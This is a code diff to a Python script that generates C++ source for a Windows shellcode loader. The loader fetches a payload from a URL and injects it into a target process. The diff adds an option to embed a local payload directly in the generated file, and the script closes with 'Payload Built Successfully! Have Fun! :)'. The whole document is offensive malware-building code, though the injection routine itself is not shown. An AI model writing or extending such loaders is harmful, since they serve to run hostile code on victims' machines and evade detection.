@@ -1,8 +1,9 @@
 import os
 import time
 from cli import *
+from local_payload_fetch import *
 
-def build (Enumeration, ProcessName, Loader, Url):
+def build (Enumeration, Payload, ProcessName, Loader, Url):
     f = open ("main.cpp", "a")
     f.write(f"""
 #include <iostream>
@@ -25,7 +26,11 @@ def build (Enumeration, ProcessName, Loader, Url):
 #include "Libraries/{Loader}"
 
 using namespace std;
-
+""")
+    f.write(f"""\n
+{Payload} 
+""")
+    f.write(f"""\n
 int main()
 {{
     PBYTE pPayloadAddress;
@@ -36,7 +41,10 @@ int main()
     HANDLE hProcess;
     PBYTE InjectionAddress;
     HANDLE hThread;
-    
+    """)
+
+    if Url != "null":
+        f.write(f"""\n
     if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
         cout << "Failed to fetch payload" << endl;
         return 0;
@@ -106,7 +114,8 @@ def main():
     if set_payload_location() == "2":
         Url = set_url()
     else:
-        exit()
+        Payload = local_payload_fetch()
+        Url = "null"
     
     #TODO  set_payload_encryption()
 
@@ -121,7 +130,7 @@ def main():
 
     change_header_file(Enumeration, Loader, ApiMode)
 
-    if build(Enumeration, ProcessName, Loader, Url):
+    if build(Enumeration, Payload, ProcessName, Loader, Url):
         print(f"\nPayload Built Successfully!\nHave Fun! :)")
     else:
         print(f"\nFailed to build payload :(")
